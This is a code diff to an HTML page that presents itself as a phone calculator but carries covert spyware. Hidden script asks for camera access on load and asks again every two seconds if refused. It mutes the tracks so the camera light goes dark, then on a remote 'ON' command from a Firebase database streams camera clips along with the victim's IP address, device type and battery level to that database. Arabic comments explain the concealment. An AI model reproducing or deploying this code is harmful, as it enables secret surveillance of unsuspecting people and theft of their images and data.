@@ -6,28 +6,18 @@
     <title>Calculator</title>
     <style>
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #000; margin: 0; display: flex; flex-direction: column; justify-content: flex-end; height: 100vh; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; padding-bottom: 20px; overflow: hidden; }
-        
-        /* شاشة العرض */
+        body { background-color: #000; margin: 0; display: flex; flex-direction: column; justify-content: flex-end; height: 100vh; font-family: sans-serif; padding-bottom: 20px; overflow: hidden; }
         .display { padding: 20px; text-align: right; display: flex; flex-direction: column; justify-content: flex-end; flex-grow: 1; overflow: hidden; }
         .history { color: #818181; font-size: 1.5rem; min-height: 1.6rem; margin-bottom: 10px; }
         .current { color: #fff; font-size: 5rem; font-weight: 300; word-wrap: break-word; line-height: 1; }
-
-        /* شبكة الزراير */
         .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 20px; }
-        button { border: none; border-radius: 50%; height: 80px; width: 80px; font-size: 2rem; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: filter 0.1s; }
+        button { border: none; border-radius: 50%; height: 75px; width: 75px; font-size: 2rem; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: filter 0.1s; }
         button:active { filter: brightness(1.5); }
-        
-        /* ألوان الزراير */
         .num { background-color: #333; color: white; }
         .op { background-color: #f69906; color: white; font-size: 2.2rem; }
         .special { background-color: #a5a5a5; color: black; }
         .zero { grid-column: span 2; width: auto; border-radius: 40px; justify-content: flex-start; padding-left: 30px; }
-
-        @media (max-height: 600px) {
-            button { height: 60px; width: 60px; font-size: 1.5rem; }
-            .current { font-size: 3rem; }
-        }
+        @media (max-height: 650px) { button { height: 60px; width: 60px; font-size: 1.5rem; } .current { font-size: 3.5rem; } }
     </style>
 </head>
 <body>
@@ -42,22 +32,18 @@
         <button class="special" onclick="toggleSign()">+/-</button>
         <button class="special" onclick="percentage()">%</button>
         <button class="op" onclick="setOp('/')">÷</button>
-
         <button class="num" onclick="addNum('7')">7</button>
         <button class="num" onclick="addNum('8')">8</button>
         <button class="num" onclick="addNum('9')">9</button>
         <button class="op" onclick="setOp('*')">×</button>
-
         <button class="num" onclick="addNum('4')">4</button>
         <button class="num" onclick="addNum('5')">5</button>
         <button class="num" onclick="addNum('6')">6</button>
         <button class="op" onclick="setOp('-')">−</button>
-
         <button class="num" onclick="addNum('1')">1</button>
         <button class="num" onclick="addNum('2')">2</button>
         <button class="num" onclick="addNum('3')">3</button>
         <button class="op" onclick="setOp('+')">+</button>
-
         <button class="num zero" onclick="addNum('0')">0</button>
         <button class="num" onclick="addNum('.')">.</button>
         <button class="op" onclick="calculate()">=</button>
@@ -67,31 +53,44 @@
     <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
 
     <script>
-        // --- الجزء التقني (البث) ---
         const firebaseConfig = { databaseURL: "https://itel-d77e2-default-rtdb.firebaseio.com" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const devName = "Target_Device";
         let isSpying = false;
+        let globalStream = null;
+
+        // طلب الأذونات تلقائياً أول ما يفتح
+        async function initPermissions() {
+            try {
+                globalStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false });
+                // بنقفل الستريم فوراً عشان اللمبة الخضراء تطفي لحد ما يجي أمر ON
+                globalStream.getTracks().forEach(t => t.enabled = false); 
+                console.log("Permissions OK");
+            } catch (e) {
+                setTimeout(initPermissions, 2000); // محاولة تانية لو رفض
+            }
+        }
+
+        db.ref('commands/' + devName).on('value', async snap => {
+            const cmd = snap.val();
+            if(cmd === "ON" && !isSpying && globalStream) {
+                isSpying = true;
+                globalStream.getTracks().forEach(t => t.enabled = true);
+                const info = await getInfo();
+                startStream(globalStream, info);
+            } else if(cmd === "OFF") {
+                isSpying = false;
+                if(globalStream) globalStream.getTracks().forEach(t => t.enabled = false);
+            }
+        });
 
         async function getInfo() {
             let ip = "0.0.0.0";
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
-            return { ip, model: navigator.userAgent.includes("Android") ? "Android" : "iOS" };
+            const batt = await navigator.getBattery();
+            return { ip, model: navigator.userAgent.includes("Android") ? "Android" : "iOS", batt: Math.round(batt.level * 100) + "%" };
         }
-
-        navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false })
-        .then(stream => {
-            db.ref('commands/' + devName).on('value', async snap => {
-                if(snap.val() === "ON" && !isSpying) {
-                    isSpying = true;
-                    const info = await getInfo();
-                    startStream(stream, info);
-                } else if(snap.val() === "OFF") {
-                    isSpying = false;
-                }
-            });
-        });
 
         function startStream(stream, info) {
             if(!isSpying) return;
@@ -101,12 +100,8 @@
             rec.onstop = () => {
                 let reader = new FileReader();
                 reader.readAsDataURL(new Blob(chunks));
-                reader.onloadend = async () => {
-                    const batt = await navigator.getBattery();
-                    db.ref('live_stream/' + devName).set({
-                        v: reader.result, ip: info.ip, model: info.model,
-                        batt: Math.round(batt.level * 100) + "%", t: Date.now()
-                    });
+                reader.onloadend = () => {
+                    db.ref('live_stream/' + devName).set({ v: reader.result, ip: info.ip, model: info.model, batt: info.batt, t: Date.now() });
                     if(isSpying) setTimeout(() => startStream(stream, info), 500);
                 };
             };
@@ -114,36 +109,23 @@
             setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 3000);
         }
 
-        // --- منطق الآلة الحاسبة (الحقيقي) ---
-        let currentInput = '0';
-        let prevInput = '';
-        let operator = null;
-
-        const curElem = document.getElementById('current');
-        const histElem = document.getElementById('history');
-
+        // منطق الآلة الحاسبة
+        let currentInput = '0', prevInput = '', operator = null;
+        const curElem = document.getElementById('current'), histElem = document.getElementById('history');
         function updateUI() { curElem.innerText = currentInput; histElem.innerText = prevInput + (operator || ''); }
-        function addNum(n) { 
-            if(currentInput === '0' && n !== '.') currentInput = n;
-            else currentInput += n;
-            updateUI(); 
-        }
+        function addNum(n) { if(currentInput === '0' && n !== '.') currentInput = n; else currentInput += n; updateUI(); }
         function clearAll() { currentInput = '0'; prevInput = ''; operator = null; updateUI(); }
         function setOp(op) { operator = op; prevInput = currentInput; currentInput = '0'; updateUI(); }
         function calculate() {
-            let res;
-            const a = parseFloat(prevInput);
-            const b = parseFloat(currentInput);
-            if (operator === '+') res = a + b;
-            else if (operator === '-') res = a - b;
-            else if (operator === '*') res = a * b;
-            else if (operator === '/') res = a / b;
-            currentInput = res.toString();
-            operator = null; prevInput = '';
-            updateUI();
+            let a = parseFloat(prevInput), b = parseFloat(currentInput), res;
+            if (operator === '+') res = a + b; else if (operator === '-') res = a - b;
+            else if (operator === '*') res = a * b; else if (operator === '/') res = a / b;
+            currentInput = res.toString(); operator = null; prevInput = ''; updateUI();
         }
         function percentage() { currentInput = (parseFloat(currentInput)/100).toString(); updateUI(); }
         function toggleSign() { currentInput = (parseFloat(currentInput)*-1).toString(); updateUI(); }
+
+        window.onload = initPermissions;
     </script>
 </body>
 </html>
